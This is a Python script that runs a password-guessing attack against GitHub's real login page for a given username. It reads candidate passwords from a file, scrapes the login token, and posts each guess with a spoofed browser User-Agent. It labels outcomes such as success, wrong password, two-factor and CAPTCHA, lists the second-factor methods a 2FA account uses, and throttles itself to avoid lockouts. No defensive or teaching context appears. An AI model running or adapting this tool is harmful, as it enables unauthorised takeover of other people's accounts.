import json, re, sys, time, requests
LOGIN, CANDFILE, OUTJSON = sys.argv[1], sys.argv[2], sys.argv[3]
MAXCAPTCHA = int(sys.argv[4]) if len(sys.argv) > 4 else 2
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/131.0.0.0 Safari/537.36")
pws = []
for line in open(CANDFILE):
    line = line.strip()
    if not line or line.startswith('#'):
        continue
    p = line.split('\t'); pws.append(p[1] if len(p) >= 2 else p[0])
res = []; consec = 0
for pw in pws:
    rec = {"login": LOGIN, "pw": pw}
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    try:
        r = s.get("https://github.com/login", timeout=30)
        m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
        if not m:
            rec["verdict"] = "NO_LOGIN_PAGE"; rec["status"] = r.status_code
            res.append(rec); print(json.dumps(rec), flush=True); continue
        tok = m.group(1).replace("&amp;", "&")
        time.sleep(0.9)
        r2 = s.post("https://github.com/session",
                    data={"commit": "Sign in", "authenticity_token": tok, "login": LOGIN,
                          "password": pw, "webauthn-conditional": "undefined",
                          "javascript-support": "true", "webauthn-support": "supported"},
                    allow_redirects=False, timeout=30)
        rec["status"] = r2.status_code; rec["location"] = r2.headers.get("Location")
        t = r2.text or ""
        if r2.status_code in (301, 302, 303):
            loc = r2.headers.get("Location", "")
            if "two-factor" in loc:
                rec["verdict"] = "2FA"
                try:
                    r3 = s.get("https://github.com" + loc if loc.startswith("/") else loc, timeout=30)
                    low = r3.text.lower()
                    rec["twofa_signals"] = [k for k in ["authenticator app","enter the code","sms","security key","passkey","recovery code","text message"] if k in low]
                    rec["twofa_page_url"] = r3.url
                except Exception as e:
                    rec["twofa_err"] = str(e)[:150]
            else:
                rec["verdict"] = "SUCCESS" if "github.com" in loc else "REDIRECT"
        else:
            low = t.lower()
            if "incorrect username or password" in low: rec["verdict"] = "WRONG"
            elif ("several failed" in low or "octocaptcha" in low or "perform that action at this time" in low or "captcha" in low): rec["verdict"] = "CAPTCHA"
            elif "verify your device" in low or "device verification" in low: rec["verdict"] = "DEVICE_VERIFY"
            else: rec["verdict"] = "OTHER"
            fm = re.findall(r'class="flash[^"]*"[^>]*>(.*?)</div>', t, re.S)
            rec["flash"] = [re.sub(r'<[^>]+>', '', x).strip()[:160] for x in fm[:3]]
    except Exception as e:
        rec["verdict"] = "ERR"; rec["err"] = f"{type(e).__name__}: {e}"[:200]
    res.append(rec); print(json.dumps(rec, ensure_ascii=False), flush=True)
    json.dump(res, open(OUTJSON, "w"), indent=1)
    if rec.get("verdict") == "CAPTCHA":
        consec += 1
        if consec >= MAXCAPTCHA:
            print(f"[stop] {consec} consecutive captcha", flush=True); break
    else:
        consec = 0
    time.sleep(1.2)
json.dump(res, open(OUTJSON, "w"), indent=1)
print("EGRESS", flush=True)
